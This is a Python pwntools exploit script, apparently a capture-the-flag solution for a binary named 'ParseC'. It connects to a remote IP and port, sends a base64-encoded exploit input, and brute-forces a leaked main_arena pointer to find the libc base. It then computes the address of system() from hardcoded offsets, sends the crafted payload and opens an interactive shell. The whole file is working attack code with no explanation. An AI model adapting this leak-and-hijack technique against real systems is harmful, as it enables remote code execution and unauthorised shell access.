#!/usr/bin/python
from pwn import *
import base64

context.log_level = 'error'
#context.log_level = 'debug'
def connect():
    if args.R:
        p = remote('123.57.4.93',34007)
        #p = remote('192.168.65.2',9999)
        #p = process('./ParseC_remote')
    else:
        p = process(argv = ['./ParseC','exp.try'])
    return p

def brute(p):
    if args.R:
        p.recvuntil('-------------------------------------------------------\n')
        f = open('./exp.try','r')
        code = f.read()
        f.close()
        payload = base64.b64encode(code)
        p.sendline(payload)
        t = p.recvline()[:-1]
        main_arena = u64(t.ljust(8,'\x00'))
        libc_base = main_arena - 0x3ebca0
        log.info('libc_base : %s' % hex(libc_base))
        main_arena = main_arena & 0xffff
        print('main_arena : %s' % hex(main_arena))
        if main_arena != 0xaca0:
            raise Exception
        t = p.recvline().strip()
        main_arena = u64(t.ljust(8,'\x00'))
        log.info('main_arena : %s' % hex(main_arena))        
    else:
        t = p.recvline()[:-1]
        main_arena = u64(t.ljust(8,'\x00'))
        libc_base = main_arena - 0x3ebca0
        log.info('libc_base : %s' % hex(libc_base))
        main_arena = main_arena & 0xffff
        print('main_arena : %s' % hex(main_arena))
        if main_arena != 0xaca0:
            raise Exception
        t = p.recvline().strip()
        main_arena = u64(t.ljust(8,'\x00'))
        log.info('main_arena : %s' % hex(main_arena))
    return libc_base
def ltof(a):
    t = struct.pack("<Q",a)
    return struct.unpack("<d",t)[0]

while True:
    try:
        p = connect()
        libc_base = brute(p)
        break
    except KeyboardInterrupt:
        exit(1)
    except:
        p.close()

if args.R:
    system = libc_base + 0x4F4E0
    #system = libc_base + 0x4F440
else:
    system = libc_base + 0x4F440
#pause()

trans = process('./ltof')
trans.sendline(str(system))
payload = trans.recvline().strip()

#payload = system
print('libc_base : %s' % hex(libc_base))
print('system : %s' % hex(system))
payload = payload[:-600]
print(payload)

p.sendline(str(payload))
p.interactive()